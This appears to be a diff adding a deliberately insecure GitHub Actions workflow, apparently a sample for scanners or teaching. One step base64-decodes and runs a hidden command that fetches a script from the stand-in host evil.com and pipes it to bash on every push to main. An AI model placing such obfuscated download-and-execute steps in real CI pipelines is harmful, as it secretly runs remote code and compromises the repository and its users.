@@ -1,0 +1,18 @@
+name: insecure-workflow
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Run obfuscated command
+        run: echo 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2NyaXB0LnNoIHwgYmFzaA==' | base64 -d | bash
+
+      - name: Build application
+        run: npm run build
